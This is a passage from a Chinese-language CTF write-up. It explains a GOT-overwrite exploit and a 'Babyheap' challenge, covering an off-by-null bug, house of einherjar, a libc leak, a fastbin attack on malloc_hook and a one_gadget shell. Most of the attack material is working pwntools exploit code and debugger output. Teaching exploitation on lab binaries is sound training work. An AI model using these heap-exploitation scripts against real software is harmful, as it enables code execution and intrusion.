    p4 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x19</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span>

    p4 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># modify item 3</span>

    p4 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x33</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#3</span>
    p4 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span>
    p4 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>
    p4 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>exe<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x19'</span>

    md<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> p4<span class="token punctuation">)</span>


    p5 <span class="token operator">=</span> p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>
    md<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> p5<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># modify atoi got table as system</span>

    <span class="token comment" spellcheck="true">#db()</span>

    <span class="token comment" spellcheck="true"># call system with /bin/sh</span>
    sla<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true">#io = exe.process(env = {"LD_PRELOAD" : libFile})</span>
        io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>remoteIp<span class="token punctuation">,</span> remotePort<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>

    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h1 id="Babyheap"><a href="#Babyheap" class="headerlink" title="Babyheap"></a>Babyheap</h1><h2 id="来源-2"><a href="#来源-2" class="headerlink" title="来源"></a>来源</h2><p>World of Attack &amp; Defense</p>
<h2 id="难度-1"><a href="#难度-1" class="headerlink" title="难度"></a>难度</h2><p>6 / 10</p>
<h2 id="保护-2"><a href="#保护-2" class="headerlink" title="保护"></a>保护</h2><pre><code>   Arch:     amd64-64-little
   RELRO:    Full RELRO
   Stack:    Canary found
   NX:       NX enabled
   PIE:      PIE enabled</code></pre>
<h2 id="简单描述-1"><a href="#简单描述-1" class="headerlink" title="简单描述"></a>简单描述</h2><p>只有4个功能, 添加,删除,查看,退出.保护全开,只有一个漏洞可以利用.</p>
<h2 id="vul-3"><a href="#vul-3" class="headerlink" title="vul"></a>vul</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">read_input</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+13h] [rbp-Dh]</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+14h] [rbp-Ch]</span>
  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>

  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> a2<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Read error!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> buf <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                       <span class="token comment" spellcheck="true">// off by null</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>off by null 漏洞,还有一个是在free时,unsigned int与signed int的索引值,但利用不了…</p>
<h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><p>house of einherjar, off by one, unlink check, fastbin attack, realloc_hook to banance stack, one_gadget</p>
<h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>通过house of einherjar实现堆合并,然后通过unsorted bin特性分割堆块,打印获取main_arena + 88地址,通过fastbin attack 打入 malloc_hook - 0x23处,通过 malloc_hook来实现Onegaget,realloc_hook调整execve第二个参数</p>
<h2 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>

<span class="token comment" spellcheck="true"># Author: I0gan</span>
<span class="token comment" spellcheck="true"># Team  : D0g3</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#from LibcSearcher import LibcSearcher</span>

<span class="token comment" spellcheck="true">#context.log_level='debug'</span>
<span class="token comment" spellcheck="true">#context.terminal = ['konsole', '-x', 'bash', 'c']</span>
<span class="token comment" spellcheck="true">#context.terminal = 'konsole'</span>

<span class="token comment" spellcheck="true">#context(arch = 'i386', os = 'linux', log_level='debug')</span>
context<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

exeFile  <span class="token operator">=</span> <span class="token string">"timu"</span>
libFile  <span class="token operator">=</span> <span class="token string">"./libc.so.6"</span>
libFile  <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>

remoteIp <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>
remotePort <span class="token operator">=</span> <span class="token number">0</span>

LOCAL <span class="token operator">=</span> <span class="token number">1</span>
LIB   <span class="token operator">=</span> <span class="token number">1</span>

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
pd32  <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> p32<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#python3 not surport str + bytes</span>
pd64  <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
db    <span class="token operator">=</span> <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Func-----------------------------</span>
<span class="token keyword">def</span> <span class="token function">ad</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Size:'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">'Data:'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Index:'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">dp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#def q():</span>
<span class="token comment" spellcheck="true">#    sla(':', str(5))</span></code></pre>
<h3 id="构造堆快布局"><a href="#构造堆快布局" class="headerlink" title="构造堆快布局"></a>构造堆快布局</h3><pre class=" language-python"><code class="language-python">    ad<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 0 为了合并</span>
    ad<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 1 为了在合并后,然后分割堆快打印出main_arena</span>
    ad<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'C'</span> <span class="token operator">*</span> <span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 2 为了可以利用fastbin attack 和 off by null</span>
    ad<span class="token punctuation">(</span><span class="token number">0xF0</span><span class="token punctuation">,</span> <span class="token string">'E\n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 3 为了使用house of einherjar 合并 chunk 0控制所有堆块</span>
    ad<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'F\n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#为了防止top chunk 向前合并</span></code></pre>
<h3 id="使用house-of-einherjar-来合并-chunk-1"><a href="#使用house-of-einherjar-来合并-chunk-1" class="headerlink" title="使用house of einherjar 来合并 chunk 1"></a>使用house of einherjar 来合并 chunk 1</h3><pre class=" language-python"><code class="language-python">    rm<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#为了使用 off by null 覆盖 chunk3 释放重新开辟</span>
    <span class="token comment" spellcheck="true"># use house of einherjar</span>
    p <span class="token operator">=</span> <span class="token string">'C'</span> <span class="token operator">*</span> <span class="token number">0x60</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x190</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#prev_size = chunk 0 addr - chunk 3 addr</span>
    ad<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#使用 off by null 覆盖 chunk 3</span>

    rm<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#先释放掉进入fastbin中, 后面只需通过溢出修改fd指向我们想要的地方</span>
    <span class="token comment" spellcheck="true"># 触发 house of eiherjar</span>
    <span class="token comment" spellcheck="true">#避免unlink检查, 先是放掉chunk 0, 这样 chunk0 的fd 和 bk指向的都是main_arena + 88,这样可以绕过unlink检查 FD-bk != P || BK->fd != p</span>
    rm<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    rm<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#合并到chunk 0</span></code></pre>
<h3 id="泄漏-main-arena-和libc基址"><a href="#泄漏-main-arena-和libc基址" class="headerlink" title="泄漏 main_arena 和libc基址"></a>泄漏 main_arena 和libc基址</h3><p>通过分割unsorted bin实现main_arena信息转移,通过开辟0x80内存后, main_arena信息会跑到chunk 1中, 由于我们还对chunk 1没有释放, 直接打印即可获取main_arena + 88 处地址</p>
<pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true"># leak main_arena</span>
    ad<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#分割 unsorted bin, main_arena 会出现在 chunk 1中</span>
    dp<span class="token punctuation">(</span><span class="token punctuation">)</span>
    main_arena <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\x7f\x00\x00'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x58</span>
    libc_base <span class="token operator">=</span> main_arena <span class="token operator">-</span> <span class="token number">0x3c4b20</span>
    li<span class="token punctuation">(</span><span class="token string">'main_arena '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>main_arena<span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base '</span> <span class="token operator">+</span>  hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<h3 id="fastbin-attack打入-malloc-hook处"><a href="#fastbin-attack打入-malloc-hook处" class="headerlink" title="fastbin attack打入 malloc_hook处"></a>fastbin attack打入 malloc_hook处</h3><pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true">#通过开辟内存溢出掌控chunk 2, 在fastbin 中chunk 2是我们之前释放的, 现在只需要修改fd指向 malloc_hook -0x23处</span>
    p <span class="token operator">=</span> <span class="token string">'\x00'</span> <span class="token operator">*</span> <span class="token number">0x80</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main_arena <span class="token operator">-</span> <span class="token number">0x33</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> <span class="token string">'\n'</span>
    ad<span class="token punctuation">(</span><span class="token number">0xA0</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>

    ad<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#for ajust fastbin</span>
</code></pre>
<h3 id="修改malloc-hook"><a href="#修改malloc-hook" class="headerlink" title="修改malloc_hook"></a>修改malloc_hook</h3><p>由于直接修改malloc_hook为one_gadget,由于参数 [rsp + x] x 为0x30,0x50,0x70都不能使[rsp + x]为0,也就是说在执行execve的时候,第二个参数的内容没有满足为 0,所以不能触发get shell, 需要使用 realloc_hook来进行调整rsp的偏移,进而修改[rsp + x]满足为0,而在realloc_hook处,我们可以填写reallc的地址根据push来调整rsp的偏移,达到 [rsp + x]为0, 而在执行push完之后,就先进行判断 realloc_hook是否为0,若不为0,就先执行 realloc_hook处,这时我们就可以填写one_gadget 到realloc_hook处来打one_gadget</p>
<h4 id="realloc-hook反汇编"><a href="#realloc-hook反汇编" class="headerlink" title="realloc_hook反汇编"></a>realloc_hook反汇编</h4><pre><code>pwndbg&gt; disass 0x7fe7cb0ea6c0
Dump of assembler code for function __GI___libc_realloc:
   0x00007fe7cb0ea6c0 &lt;+0&gt;:    push   r15
   0x00007fe7cb0ea6c2 &lt;+2&gt;:    push   r14
   0x00007fe7cb0ea6c4 &lt;+4&gt;:    push   r13
   0x00007fe7cb0ea6c6 &lt;+6&gt;:    push   r12
   0x00007fe7cb0ea6c8 &lt;+8&gt;:    mov    r13,rsi
   0x00007fe7cb0ea6cb &lt;+11&gt;:    push   rbp
   0x00007fe7cb0ea6cc &lt;+12&gt;:    push   rbx
   0x00007fe7cb0ea6cd &lt;+13&gt;:    mov    rbx,rdi
   0x00007fe7cb0ea6d0 &lt;+16&gt;:    sub    rsp,0x38
   0x00007fe7cb0ea6d4 &lt;+20&gt;:    mov    rax,QWORD PTR [rip+0x33f8f5]        # 0x7fe7cb429fd0
   0x00007fe7cb0ea6db &lt;+27&gt;:    mov    rax,QWORD PTR [rax]
   0x00007fe7cb0ea6de &lt;+30&gt;:    test   rax,rax
   0x00007fe7cb0ea6e1 &lt;+33&gt;:    jne    0x7fe7cb0ea8e8 &lt;__GI___libc_realloc+552&gt;
   0x00007fe7cb0ea6e7 &lt;+39&gt;:    test   rsi,rsi
   0x00007fe7cb0ea6ea &lt;+42&gt;:    jne    0x7fe7cb0ea6f5 &lt;__GI___libc_realloc+53&gt;
   0x00007fe7cb0ea6ec &lt;+44&gt;:    test   rdi,rdi
</code></pre>
<p>通过调试试出了两个one_gadget满足execve 第二个参数内容为0</p>
<ol>
<li>malloc_hook = libc_base + 0x4526a, realloc_hook = realloc_addr + 2</li>
<li>malloc_hook = libc_base + 0xf1147, realloc_hook = realloc_addr + 20</li>
</ol>
<h4 id="execve执行情况如下"><a href="#execve执行情况如下" class="headerlink" title="execve执行情况如下"></a>execve执行情况如下</h4><pre><code>0x7fe7cb15715d &lt;exec_comm+2285&gt;    call   execve &lt;0x7fe7cb132770&gt;
path: 0x7fe7cb1f2d57 ◂— 0x68732f6e69622f /* &#39;/bin/sh&#39; */
argv: 0x7ffe640ad200 ◂— 0x0
envp: 0x7ffe640ad2c8 —▸ 0x7ffe640adfaf ◂— &#39;LD_PRELOAD=/lib/x86_64-linux-gnu/libc.so.6&#39;</code></pre>
<h4 id="payload构造如下"><a href="#payload构造如下" class="headerlink" title="payload构造如下"></a>payload构造如下</h4><pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true">#modify malloc_hook</span>
    realloc_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'realloc'</span><span class="token punctuation">]</span>
    li<span class="token punctuation">(</span><span class="token string">'realloc_addr '</span> <span class="token operator">+</span>  hex<span class="token punctuation">(</span>realloc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    gadget <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span> <span class="token number">0x4526a</span><span class="token punctuation">,</span> <span class="token number">0xf02a4</span><span class="token punctuation">,</span> <span class="token number">0xf1147</span><span class="token punctuation">]</span>
    one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> gadget<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
    p <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x13</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># realloc_hook</span>
    <span class="token comment" spellcheck="true">#mallok_hook then call realloc for banance stackthen call one_gadget</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>realloc_addr <span class="token operator">+</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># malloc_hook</span>
    p <span class="token operator">+=</span> <span class="token string">'\n'</span>
    ad<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
</code></pre>
<h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true"># get shell</span>
    sl<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span></code></pre>
<h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>

<span class="token comment" spellcheck="true"># Author: I0gan</span>
<span class="token comment" spellcheck="true"># Team  : D0g3</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#from LibcSearcher import LibcSearcher</span>

<span class="token comment" spellcheck="true">#context.log_level='debug'</span>
<span class="token comment" spellcheck="true">#context.terminal = ['konsole', '-x', 'bash', 'c']</span>
<span class="token comment" spellcheck="true">#context.terminal = 'konsole'</span>

<span class="token comment" spellcheck="true">#context(arch = 'i386', os = 'linux', log_level='debug')</span>
context<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

exeFile  <span class="token operator">=</span> <span class="token string">"timu"</span>
libFile  <span class="token operator">=</span> <span class="token string">"./libc.so.6"</span>
libFile  <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>

remoteIp <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>
remotePort <span class="token operator">=</span> <span class="token number">0</span>

LOCAL <span class="token operator">=</span> <span class="token number">1</span>
LIB   <span class="token operator">=</span> <span class="token number">1</span>

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
pd32  <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> p32<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#python3 not surport str + bytes</span>
pd64  <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
db    <span class="token operator">=</span> <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Func-----------------------------</span>
<span class="token keyword">def</span> <span class="token function">ad</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
